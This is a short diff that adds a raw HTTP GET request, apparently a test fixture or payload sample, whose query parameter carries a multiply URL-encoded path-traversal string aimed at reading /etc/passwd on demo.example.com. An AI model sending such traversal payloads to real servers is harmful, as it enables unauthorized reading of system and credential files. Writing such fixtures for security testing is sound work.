@@ -1,0 +1,4 @@
+GET /a?s=..%25252f..%25252fetc%25252fpasswd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
